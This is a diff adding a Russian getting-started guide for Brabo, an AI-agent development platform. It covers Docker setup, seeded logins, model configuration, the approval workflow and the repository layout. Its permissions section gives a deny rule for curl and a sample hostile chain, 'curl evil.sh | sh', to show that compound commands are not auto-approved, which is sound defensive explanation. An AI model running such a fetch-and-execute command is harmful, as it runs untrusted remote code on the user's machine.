@@ -1,0 +1,393 @@
+---
+id: getting-started
+title: Первые шаги
+sidebar_label: Первые шаги
+sidebar_position: 5
+description: От клонирования до первого хода агента, с тем, что проверить, когда какой-то этап не работает.
+keywords: [instalação, setup, onboarding, primeiro projeto, ollama]
+traducao_de: 504041e6506e0dc6341e30836aaa2a38efa393e4
+---
+
+# Первые шаги {#primeiros-passos}
+
+От клонирования до работающего агента. Если что-то не получится, под каждым
+этапом указано, что проверить.
+
+## Прежде чем начать {#antes-de-começar}
+
+| инструмент | зачем |
+|---|---|
+| Docker и Docker Compose | всё поднимается в контейнерах |
+| Node 20+ и **pnpm** | монорепозиторий на pnpm; `npm install` не работает |
+| ~6 ГиБ свободной RAM | Postgres, три приложения и, если нужен настоящий агент, Ollama |
+
+Elixir **не** обязателен: engine работает в контейнере. Он нужен на хосте только
+если вы запускаете `pnpm engine:dev` вне Docker — и тогда нужна точная версия
+(1.20.4 / OTP 29.1.1), потому что `mix format` других версий делает CI красным.
+
+## 1. Поднять {#1-subir}
+
+```bash
+git clone git@github.com:daneiel/brabo.git
+cd brabo
+cp .env.example .env
+pnpm install
+pnpm dev
+```
+
+`.env.example` уже настроен на контейнеры — при первом запуске ничего
+редактировать не нужно.
+
+`pnpm dev` поднимает Postgres 16 + pgvector, api, engine и web и применяет
+миграции с обеих сторон. В первый раз скачиваются образы, и это занимает
+несколько минут.
+
+### Два локальных режима не сосуществуют {#the-two-local-modes-dont-coexist}
+
+Есть два способа запустить Brabo на вашей машине, и они **конкурируют за одни и
+те же порты**:
+
+| режим | запускается | web на | что это |
+|---|---|---|---|
+| **разработка** | `pnpm dev` | <http://localhost:5173> | compose + Vite, с hot reload |
+| **валидация** | `make deploy-local` | <http://localhost:8088> | k3d с production-образами |
+
+Оба публикуют api на `:3000` и engine на `:4000`. Это **сделано намеренно**
+(ADR 0025, решение 10): при одинаковых портах `docker/smoke.sh` работает в обоих
+режимах без перевода. Цена — одновременно может работать только один.
+
+Когда кластер поднят, `pnpm dev` не может опубликовать порт `api`; поскольку
+сервис `web` зависит от него, **5173 так и не открывается**. Перед compose
+запускается `preflight`, который говорит именно это вместо `port is already
+allocated` от Docker:
+
+```bash
+make k8s-down && pnpm dev     # do modo validação para o de desenvolvimento
+```
+
+Чтобы узнать, в каком режиме вы находитесь, не гадая: `pnpm dev:preflight`.
+
+### Установка и checkout на одной машине {#uma-instalação-e-um-checkout-na-mesma-máquina}
+
+Compose разработки — это Docker-проект **`brabo-dev`** (контейнеры
+`brabo-dev-api-1`…, тома `brabo-dev_pgdata`…); установка, сделанная через
+`install.sh`, — это **`brabo`**. До ADR 0170 оба назывались `brabo`, поэтому
+делили контейнеры, сеть и тома, и `reset-total.sh` стёр бы базу установки.
+
+Даже с разделёнными именами `pnpm dev` (через preflight) и `reset-total.sh`
+**отказываются** работать, пока на машине есть контейнер из compose установки,
+и перечисляют их. Для разработки остановите установку **без** `-v` — тома и
+данные останутся, а `up -d` вернёт её обратно:
+
+```bash
+docker compose -f <pasta da instalação>/docker/docker-compose.install.yml \
+  --env-file <pasta da instalação>/.env down   # o preflight imprime os caminhos exatos
+```
+
+**Разрабатывали здесь до ADR 0170?** Данные остаются в старых томах `brabo_*`,
+а следующий `pnpm dev` начнёт с пустых `brabo-dev_*`; preflight предупредит об
+этом. Как скопировать данные, начать с нуля и отличить тома старой разработки
+от томов установки, описано в runbook, «Moving a dev environment to brabo-dev».
+
+### Локальная папка для workspace {#local-folder-for-workspaces}
+
+По умолчанию файлы, которые пишут агенты, живут в управляемом томе Docker — это
+не папка, которую можно открыть в Finder/Explorer. Чтобы заменить его настоящей
+папкой на диске, задайте в `.env`:
+
+```bash
+PROJECT_WORKSPACES_HOST_DIR=~/brabo-projetos
+GIT_LOCAL_REPOS_HOST_DIR=~/brabo-projetos-bare
+```
+
+Всегда обе вместе — `api` и `engine` читают один и тот же путь, а разные
+значения заставили бы их видеть разные деревья одного и того же репозитория.
+Выбранная папка становится корнем **всех** проектов этого экземпляра — не
+указывайте весь `$HOME` или папку с другими вашими секретами.
+
+Внутри неё у каждого проекта своя подпапка, названная по `workspace_dir_name`
+(RN-109): проект, созданный после этого изменения, получает ЧИТАЕМОЕ имя,
+`<pasta>/<slug>-<8 chars do id>` (например, `<pasta>/checkout-
+3f2b1c8e`), вместо чистого UUID — его легче узнать, открыв папку в
+Finder/Explorer. Проект, созданный ДО этого изменения, сохраняет папку с именем
+из чистого UUID (`<pasta>/<project_id>`): имя определяется один раз, при
+создании, и никогда не пересчитывается — даже если slug проекта позже меняется
+в Настройках.
+
+В политике одобрения ничего не меняется: внутри области проекта агент и так
+имел более свободный доступ, а вне её уже запрашивал одобрение (RN-075) —
+просто то, что раньше было невидимым внутри тома, теперь лежит в папке, которую
+вы можете открыть своим редактором и `git`.
+
+Контейнеры `api` и `engine` в разработке работают от **root** (та же уже
+известная ситуация с `node_modules`/`apps/api/dist` — см. предупреждение в
+начале этого репозитория). Каждый файл, который агент запишет в локальную
+папку, на вашем диске будет принадлежать `root` — чтобы потом редактировать и
+удалять без `sudo`, выполните один раз `sudo chown -R $USER ~/brabo-projetos`
+(поправьте путь на выбранный вами). Подтверждено выполнением: `docker run`,
+писавший в тестовый bind mount, оставил файл недоступным обычному пользователю,
+пока второй контейнер (от root) его не удалил.
+
+Проверено только на Linux/macOS. У bind mount хоста в Docker Desktop для
+Windows есть известные ловушки (права/владелец между NTFS и пользователем
+контейнера, а NTFS не различает регистр там, где `git worktree` этого ожидает) —
+пока не включайте это там.
+
+**Если не поднимается:**
+
+| симптом | причина |
+|---|---|
+| порт занят | почти всегда это всё ещё поднятый локальный кластер — см. выше. Если нет, измените `API_PORT`, `ENGINE_PORT`, `WEB_PORT` или `OLLAMA_PORT` в `.env`. Менять `WEB_PORT` безопасно: `WEB_ORIGIN` для CORS выводится из него, так что допустимый origin следует за портом ([ADR 0037](adr/0037-cors-do-engine-e-a-porta-como-contrato.md)) |
+| api поднимается и падает | смотрите `docker compose logs api` — почти всегда дело в миграции |
+
+## 2. Войти {#2-entrar}
+
+Вход обеспечивает сама api — внешнего IdP больше нет
+([ADR 0032](adr/0032-corte-do-keycloak-e-sessao-em-cookie.md)). Создайте
+готового пользователя через seed:
+
+```bash
+pnpm --filter api seed
+```
+
+Он создаёт `owner@brabo.dev` (owner) и `dev@brabo.dev` (developer), оба уже с
+подтверждённым e-mail и паролем `brabo12345678` — его можно переопределить
+через `BRABO_SEED_PASSWORD`. Вместе с ними создаётся workspace **Acme Corp**,
+готовый к созданию проекта.
+
+Откройте <http://localhost:5173> и войдите с этими учётными данными.
+
+> **Почему seed, а не регистрация через экран?** Регистрация работает, но вход
+> требует подтверждённого e-mail, а `MailSender` на этой фазе только пишет в
+> лог — ссылка подтверждения выводится в лог api и по умолчанию **без токена**.
+> Чтобы пройти настоящий поток регистрации, включите `AUTH_MAIL_LOG_TOKENS=true`
+> в `.env` и возьмите ссылку из `docker compose logs api`. Неудобство
+> намеренное: токен подтверждения в логе приложения — это учётные данные
+> открытым текстом.
+
+**Если вход возвращает 401 при правильном пароле:** проверьте, что seed
+выполнялся против **той же** базы, которую использует api, — `DATABASE_URL` из
+`.env`. Ответ одинаков для неверного пароля, несуществующего e-mail и
+заблокированной учётной записи, намеренно
+([RN-032](business-rules/autenticacao.md#rn-032)), так что он не различает эти
+случаи для вас.
+
+## 3. Настроить модель {#3-configurar-um-modelo}
+
+Одна уже есть: контейнер Ollama сам скачивает **`llama3.2:1b`** при первом
+запуске. Её достаточно, чтобы увидеть работу системы от начала до конца без
+какой-либо настройки.
+
+Для настоящей работы она слишком мала, поэтому, когда захотите большего:
+
+**Локальная модель побольше** — бесплатно и работает офлайн:
+
+```bash
+docker compose -f docker/docker-compose.yml exec ollama ollama pull qwen2.5:7b
+```
+
+**API провайдера** — в UI, в **Проект → Настройки → Учётные данные**. Ключ
+шифруется envelope encryption до того, как попадёт в базу.
+
+Модель разрешается каскадом — **сессия > агент > проект > workspace**, первое
+существующее значение ([RN-020](business-rules/custo.md#rn-020)). Можно оставить
+локальную модель в целом и поставить API-модель только на QA — роль, которой
+маленькая модель подходит меньше всего.
+
+> С GPU NVIDIA используйте `pnpm dev:gpu`. Без резервирования устройства Ollama
+> работает на 100% CPU, и промпт в 7 000 токенов занимает ~50 с **только на
+> загрузку** — агент кажется зависшим, хотя на самом деле читает. Override
+> подключается по желанию, потому что без `nvidia-container-toolkit` на хосте
+> резервирование приводит к тому, что сервис **не поднимается**.
+
+## 4. Создать проект {#4-criar-um-projeto}
+
+Dashboard → **Новый проект**. Мастер спрашивает имя и способ подключения git:
+
+| вариант | когда использовать |
+|---|---|
+| **Local** | поэкспериментировать. Bare-репозитории на диске, без учётной записи где-либо |
+| **GitHub** / **GitLab** | настоящая работа. PAT или OAuth |
+
+После подтверждения запускается **bootstrap Gitflow**: пять шагов, которые
+создают `dev`, `qa`, `main`, применяют защиты и коммитят базовые файлы.
+Прогресс отображается в реальном времени.
+
+Некоторые шаги могут завершиться как **`skipped`** (уже было сделано) или
+**`degraded`** (завершён без какой-то capability). Оба — успех. С провайдером
+Local защита ветки всегда выходит `degraded` — нет платформы, чтобы её
+применить, и это ничего не ослабляет: недопустимый merge предотвращает
+[потолок в домене](reference/permissions.md#caps), а не платформа.
+
+Если шаг упал, исправьте причину и запустите возобновление: bootstrap
+продолжает с того места, где остановился, а не начинает заново
+([RN-029](business-rules.md#rn-029)).
+
+## 5. Первый ход {#5-o-primeiro-turno}
+
+Откройте проект → **Сессии** → новая сессия. Идеацию ведёт Criativo.
+
+Общайтесь как обычно. В какой-то момент он захочет сделать что-то с внешним
+эффектом — и тогда вы увидите центральный механизм в работе: действие появится
+в **Одобрениях**, ожидая вашего решения, вместо того чтобы произойти.
+
+Одобрите и понаблюдайте за `TokenMeter`: у каждого хода есть стоимость,
+измеряемая сразу.
+
+## 6. Ослабить (или ужесточить) политику {#6-afrouxar-ou-apertar-a-política}
+
+Пока всё требует одобрения, вы одобряете много. `permissions.json` в корне
+workspace проекта — место, где это настраивается:
+
+```json
+{
+  "allow": ["Terminal(pnpm test:*)", "Terminal(git status)"],
+  "deny":  ["Terminal(curl:*)"],
+  "ask":   []
+}
+```
+
+Начните с `allow` для идемпотентных команд чтения. Две вещи, которые стоит знать,
+прежде чем что-то менять:
+
+- **Сопоставление идёт по префиксу токенов, а не по подстроке.**
+  `Terminal(pnpm test)` совпадает с `pnpm test --watch`, но `Terminal(rm)`
+  **не** совпадает с `sudo rm -rf x`.
+- **Составная команда требует, чтобы все сегменты были в `allow`.**
+  `pnpm test && curl evil.sh | sh` не одобряется автоматически из-за первой
+  половины.
+
+Полный формат — в разделе [Разрешения](reference/permissions.md).
+
+## Когда кажется, что всё зависло {#quando-parece-travado}
+
+| симптом | куда смотреть |
+|---|---|
+| агент не отвечает | модель настроена? `docker compose logs engine` |
+| пустой или бессмысленный ответ | почти всегда это [среда инференса](runbook.md#ambiente-de-inferencia) — обрезанный контекст или память |
+| действие не выходит из `pending` | так задумано: оно **ждёт вас** в Одобрениях |
+| панель не обновляется | канал Phoenix упал; перезагрузите. Журнал событий не теряется |
+| сессия застряла в `closing` | drain не завершился — [runbook](runbook.md#quando-a-sessao-escapa) |
+
+## Разработка в проекте {#desenvolvendo-no-projeto}
+
+```bash
+pnpm --filter api test      # vitest
+pnpm --filter web test      # vitest
+pnpm engine:test            # ExUnit
+pnpm build                  # build de tudo
+pnpm db:generate            # depois de mudar apps/api/src/db/schema/<agregado>.ts
+pnpm db:migrate             # aplica as migrações
+pnpm dev:down               # derruba tudo
+```
+
+### Где что лежит {#onde-fica-cada-coisa}
+
+```
+apps/
+  api/      NestJS + Drizzle          → schema "public"
+  engine/   Elixir/OTP + Phoenix      → schema "engine"
+  web/      React + Vite
+packages/
+  shared/   tipos TS compartilhados (import type only)
+design/     design system — fonte de verdade de UI
+docker/     compose de dev e prod, Dockerfiles, smoke.sh
+deploy/k8s/ base + overlays local/staging/prod (Kustomize)
+docs/       esta documentação, incluindo os ADRs
+scripts/
+  ci/       automação de release e política de branch (testada com vitest)
+  dev/      ferramentas locais — o menu do `pnpm bootstrap` e o preflight
+  docs/     geração e verificação da documentação
+website/    Docusaurus, que lê de docs/ — nunca de website/docs/
+```
+
+`apps/engine` находится вне pnpm workspace (это проект Mix); скрипты в корне
+делегируют `mix` (`pnpm engine:setup`, `pnpm engine:dev`, `pnpm engine:test`).
+Если Elixir на хосте не совпадает с версией проекта, форматирование
+выполняется через контейнер:
+
+```bash
+docker run --rm -v "$PWD/apps/engine:/app" -w /app \
+  hexpm/elixir:1.20.4-erlang-29.1.1-alpine-3.24.2 mix format
+```
+
+**База данных.** Один Postgres, одна база (`brabo`), две схемы, чтобы ничего не
+пересекалось: api (Drizzle) использует `public`, с миграциями в
+`apps/api/src/db/migrations/` и одним файлом схемы на агрегат
+(`db/schema.ts` — только barrel); engine (Ecto/Oban) использует `engine` через
+`migration_default_prefix`, с миграциями в
+`apps/engine/priv/repo/migrations/`. pgvector включается файлом
+`docker/postgres/init.sql`, который выполняется один раз при создании тома.
+
+**Тесты, защищающие свойства.** Ни одна функция не принимается без теста
+успешного сценария и одного сценария отказа. Git-провайдеры проходят единый
+контрактный набор, запускаемый против всех трёх (Local, GitHub, GitLab).
+`apps/api/test/interfaces/route-surface.spec.ts` сверяет маршруты с
+[`security-surface.md`](security-surface.md) — новый маршрут без
+классификации ломает тест, — а `apps/engine/test/engine_web/route_surface_test.exs`
+требует 401 без токена на каждом маршруте engine, кроме названных исключений.
+
+**Ход от начала до конца:**
+
+```mermaid
+sequenceDiagram
+  participant U as Você
+  participant W as web
+  participant A as api
+  participant E as engine
+  participant L as LLM
+
+  U->>W: abre uma sessão
+  W->>A: POST /sessions
+  A->>A: grava session.created (event log + outbox)
+  A-->>E: Oban consome a outbox
+  E->>E: SessionServer + Harness montam o contexto
+  E->>L: turno
+  L-->>E: "quero rodar esta ferramenta"
+  E->>A: vira proposed_action
+  A->>A: IAM → agent_autonomy → permissions.json → tetos
+  A-->>U: pede aprovação
+  U->>A: aprova
+  A-->>E: executa
+  E->>A: evento imutável
+  A-->>W: broadcast — o painel atualiza
+```
+
+### Меню, чтобы не запоминать всё это {#o-menu-para-não-decorar-isso-tudo}
+
+```bash
+pnpm bootstrap
+```
+
+Эти команды живут в трёх местах, которые не связаны между собой, —
+`package.json`, `Makefile` (Kubernetes) и скрипты в `deploy/k8s/` и `docker/`.
+Меню собирает четыре группы (Docker, K8s, Database, Test) за одной дверью,
+навигация цифрой без Enter, `v` — назад, `q` — выход; допустимые сочетания
+показаны в нижней строке. Пока команда выполняется, экран показывает только то,
+что она выполняется, — `↓` раскрывает вывод в реальном времени, а `↑` скрывает
+его.
+
+Оно **ничего не реализует заново**: каждый пункт вызывает ровно ту команду,
+которая уже существует, а `pnpm bootstrap --print-commands` печатает всё дерево с
+командой каждого листа, не выполняя их, — так можно проверить, что оно делает,
+прежде чем позволить ему это сделать. Полный список — в разделе
+[Скрипты](reference/scripts.md).
+
+Один пункт требует осторожности: **`Database › Delete`** удаляет все таблицы
+(и api, и engine, которые делят одну базу). Это единственный экран, который
+просит Enter, требует ввести имя базы и в конце сообщает, что восстановление —
+это `pnpm db:migrate` **и** `pnpm engine:migrate`.
+
+Всегда работайте в `feature/*` от `dev`, с conventional commits на pt-BR.
+Полные соглашения — в `CLAUDE.md`.
+
+> Контейнеры `api` и `web` в разработке работают от root и пишут в bind mount.
+> Если потом захотите собирать на хосте, выполните один раз
+> `sudo chown -R $USER apps/api/dist apps/*/node_modules`.
+
+## Дальше {#depois}
+
+- [Архитектура](architecture.md) — как части складываются вместе
+- [Бизнес-правила](business-rules.md) — что гарантирует система и где это живёт
+  в коде
+- [Runbook](runbook.md) — когда выйдете за пределы разработки
